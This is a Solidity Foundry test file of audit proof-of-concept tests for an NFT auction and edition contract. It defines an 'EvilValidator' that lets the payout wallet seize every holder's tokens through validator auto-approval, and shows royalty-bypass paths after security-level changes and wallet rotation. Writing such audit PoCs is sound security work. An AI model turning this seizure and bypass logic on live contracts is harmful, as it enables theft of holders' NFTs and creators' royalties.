// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

// Fable fourth-pass PoCs for commit 1c7c1a9. Not part of the package test inventory.
import { TestBase } from "../TestBase.sol";
import { Vm } from "forge-std/Vm.sol";
import { RankedAuction } from "../../src/RankedAuction.sol";
import { AuctionEdition } from "../../src/AuctionEdition.sol";
import {
    StrictAuthorizedTransferSecurityRegistry
} from "../vendor/opensea/src/StrictAuthorizedTransferSecurityRegistry.sol";
import { TransferSecurityLevels } from "../vendor/opensea/src/interfaces/IStrictAuthorizedTransferSecurityRegistry.sol";

/// @dev A validator that approves everything and can also act as an operator.
contract EvilValidator {
    function validateTransfer(address, address, address, uint256) external view { }
    function setTokenTypeOfCollection(address, uint16) external { }
    function take(AuctionEdition token, address from, address to, uint256 id) external {
        token.transferFrom(from, to, id);
    }
}

/// @dev A generic operator that pays no royalty (stands in for any non-royalty venue).
contract FreeOperator {
    function move(AuctionEdition token, address from, address to, uint256 id) external {
        token.transferFrom(from, to, id);
    }
}

contract FableFourthPassTest is TestBase {
    StrictAuthorizedTransferSecurityRegistry internal reg;

    function setUp() public override {
        super.setUp();
        mintForMarket(); // settles, mints IDs 1-100 to alice, alice approves local market
        reg = StrictAuthorizedTransferSecurityRegistry(edition.OPENSEA_TRANSFER_VALIDATOR());
    }

    function registry() internal view returns (StrictAuthorizedTransferSecurityRegistry) {
        return reg;
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-1: payout wallet -> malicious validator + auto-approval => seizure of any holder's NFT
    // ---------------------------------------------------------------------------------------------
    function testF4_01_PayoutWalletSeizesHolderTokenViaValidatorAutoApproval() public {
        EvilValidator evil = new EvilValidator();
        assertEq(edition.ownerOf(1), alice);
        assertFalse(edition.isApprovedForAll(alice, address(evil)));

        vm.startPrank(payoutWallet);
        edition.setTransferValidator(address(evil));
        edition.setAutomaticApprovalOfTransfersFromValidator(true);
        vm.stopPrank();

        // alice never approved anyone; no marketplace, no royalty, no SignedZone.
        assertTrue(edition.isApprovedForAll(alice, address(evil)));
        uint256 creatorBefore = payoutWallet.balance;
        evil.take(edition, alice, payoutWallet, 1);
        assertEq(edition.ownerOf(1), payoutWallet);
        assertEq(payoutWallet.balance, creatorBefore); // zero royalty paid
        assertEq(edition.transferNonce(1), 1);

        // Whole collection is takeable in a loop.
        for (uint256 id = 2; id <= 100; ++id) {
            evil.take(edition, alice, payoutWallet, id);
        }
        assertEq(edition.balanceOf(payoutWallet), 100);
        assertEq(edition.balanceOf(alice), 0);
    }

    /// Control: a malicious validator WITHOUT auto-approval cannot move tokens (still needs ERC-721 approval).
    function testF4_01_Control_MaliciousValidatorWithoutAutoApprovalCannotSeize() public {
        EvilValidator evil = new EvilValidator();
        vm.prank(payoutWallet);
        edition.setTransferValidator(address(evil));
        assertFalse(edition.autoApproveTransfersFromValidator());
        vm.expectRevert(bytes("ERC721: caller is not token owner or approved"));
        evil.take(edition, alice, payoutWallet, 1);
        assertEq(edition.ownerOf(1), alice);
    }

    /// Control: the real registry as validator + auto-approval is harmless by itself (registry never initiates transfers),
    /// but the flag is a loaded gun waiting for a validator swap.
    function testF4_01_Control_AutoApprovalAloneWithRealRegistry() public {
        vm.prank(payoutWallet);
        edition.setAutomaticApprovalOfTransfersFromValidator(true);
        assertTrue(edition.isApprovedForAll(alice, edition.OPENSEA_TRANSFER_VALIDATOR()));
        // Then a later validator swap by the same admin completes the seizure path.
        EvilValidator evil = new EvilValidator();
        vm.prank(payoutWallet);
        edition.setTransferValidator(address(evil));
        evil.take(edition, alice, bob, 7);
        assertEq(edition.ownerOf(7), bob);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-2: payout wallet can drop the registry policy (documented trusted-admin) -> royalty-free operator,
    //        but NOT theft: a holder approval is still required.
    // ---------------------------------------------------------------------------------------------
    function testF4_02_PayoutWalletLevelOneMakesAnyApprovedOperatorRoyaltyFree() public {
        FreeOperator op = new FreeOperator();
        // Before: not whitelisted, transfer blocked even with approval.
        vm.prank(alice);
        edition.setApprovalForAll(address(op), true);
        vm.expectRevert();
        op.move(edition, alice, bob, 1);

        vm.prank(payoutWallet); // owner() == payoutWallet satisfies the registry's owner check
        registry().setTransferSecurityLevelOfCollection(address(edition), TransferSecurityLevels.One);
        uint256 creatorBefore = payoutWallet.balance;
        op.move(edition, alice, bob, 1);
        assertEq(edition.ownerOf(1), bob);
        assertEq(payoutWallet.balance, creatorBefore);

        // Even at level 1, without approval nothing moves (no theft through the registry path).
        FreeOperator other = new FreeOperator();
        vm.expectRevert(bytes("ERC721: caller is not token owner or approved"));
        other.move(edition, alice, bob, 2);
        // And a direct owner transfer now works too (OTC re-enabled).
        vm.prank(alice);
        edition.transferFrom(alice, carol, 2);
        assertEq(edition.ownerOf(2), carol);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-3: a custom list created by the payout wallet survives rotation under the OLD wallet's control.
    // ---------------------------------------------------------------------------------------------
    function testF4_03_OldPayoutWalletKeepsCustomListAfterRotation() public {
        // Current wallet needs a compatible venue -> creates its own list copy (the only way; edition owns list N).
        vm.startPrank(payoutWallet);
        uint120 custom = registry().createListCopy("creator list", edition.tradingListId());
        registry().applyListToCollection(address(edition), custom);
        vm.stopPrank();
        assertEq(registry().listOwners(custom), payoutWallet);

        // Rotate to carol.
        vm.prank(payoutWallet);
        auction.proposePayoutWallet(carol);
        vm.prank(carol);
        auction.acceptPayoutWallet();
        assertEq(edition.owner(), carol);

        // The OLD wallet still owns the applied list and can add a royalty-free operator.
        FreeOperator op = new FreeOperator();
        vm.prank(payoutWallet);
        registry().addAccountToWhitelist(custom, address(op));
        assertTrue(registry().isAccountWhitelistedByCollection(address(edition), address(op)));
        vm.prank(alice);
        edition.setApprovalForAll(address(op), true);
        uint256 carolBefore = carol.balance;
        op.move(edition, alice, bob, 1);
        assertEq(edition.ownerOf(1), bob);
        assertEq(carol.balance, carolBefore); // new wallet receives nothing

        // The new wallet cannot edit that list...
        vm.prank(carol);
        vm.expectRevert();
        registry().removeAccountFromWhitelist(custom, address(op));
        // ...its only remedy is a full reconfiguration (fresh copy of live list 0).
        vm.prank(carol);
        edition.configureEnforcedTrading();
        assertFalse(registry().isAccountWhitelistedByCollection(address(edition), address(op)));
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-4: rotation emits no ERC-173 OwnershipTransferred on the edition (indexers may cache the old owner).
    // ---------------------------------------------------------------------------------------------
    function testF4_04_NoOwnershipTransferredEventOnEdition() public {
        vm.prank(payoutWallet);
        auction.proposePayoutWallet(carol);
        vm.recordLogs();
        vm.prank(carol);
        auction.acceptPayoutWallet();
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("OwnershipTransferred(address,address)");
        for (uint256 i; i < logs.length; ++i) {
            assertTrue(!(logs[i].emitter == address(edition) && logs[i].topics[0] == sig), "edition emitted event");
            assertTrue(logs[i].emitter != address(edition), "edition emitted any event");
        }
        assertEq(edition.owner(), carol);
    }

    // ---------------------------------------------------------------------------------------------
    // PoC-5: whatever is whitelisted in the registry's list 0 becomes a royalty-free operator for LNTV.
    //        (Fixture list 0 is empty; live list 0 holds two operators — see fork test.)
    // ---------------------------------------------------------------------------------------------
    function testF4_05_ListZeroContentsAreInheritedByConfiguration() public {
        // Simulate a registry whose list 0 already whitelists an operator: deploy a fresh registry owned by
        // this test, seed list 0, and point a fresh edition at it via a fresh auction (etch keeps code only,
        // so use a separate validator address through setTransferValidator after configuration).
        StrictAuthorizedTransferSecurityRegistry seeded = new StrictAuthorizedTransferSecurityRegistry(address(this), address(0));
        FreeOperator op = new FreeOperator();
        seeded.addAccountToWhitelist(0, address(op));
        // Copy list 0 the same way configureEnforcedTrading does, on behalf of the edition.
        vm.startPrank(address(edition));
        uint120 copy = seeded.createListCopy("LNTV royalty enforcement", 0);
        seeded.addAccountToAuthorizers(copy, edition.OPENSEA_SIGNED_ZONE());
        seeded.addAccountToWhitelist(copy, address(market));
        seeded.applyListToCollection(address(edition), copy);
        seeded.setTransferSecurityLevelOfCollection(address(edition), TransferSecurityLevels.Four);
        vm.stopPrank();
        vm.prank(payoutWallet);
        edition.setTransferValidator(address(seeded));

        assertTrue(seeded.isAccountWhitelistedByCollection(address(edition), address(op)));
        vm.prank(alice);
        edition.setApprovalForAll(address(op), true);
        uint256 creatorBefore = payoutWallet.balance;
        op.move(edition, alice, bob, 1);
        assertEq(edition.ownerOf(1), bob);
        assertEq(payoutWallet.balance, creatorBefore);
    }
}
